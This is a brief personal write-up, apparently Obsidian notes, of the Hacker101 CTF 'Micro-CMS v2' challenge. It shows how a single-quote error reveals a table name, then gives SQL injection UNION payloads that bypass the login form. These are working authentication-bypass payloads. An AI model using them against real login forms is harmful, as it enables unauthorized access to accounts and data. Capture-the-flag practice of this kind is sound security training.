## Hacker101 CTF
### 1) Micro-CMS v2

Trying out different basic loads to check if something gets triggered:
![[Pasted image 20221216203410.png]]
Even writing `'` in the username field (not the psw) triggered the following error:
![[Pasted image 20221216203616.png]]
From this, we can tell the name of the database 'admins' so we can run a UNION attack:

`' UNION SELECT "xyz" as password FROM admins where ''='';--` and "xyz" in the psw field

>[!faq] Why does it not work if we use some other ending?
>It works with:
>`Username: ' UNION SELECT 'xyz' AS password FROM admins WHERE '1'='1'
>Can you find some other payload?

`' UNION SELECT "admin" as users FROM passwords where ''='';--`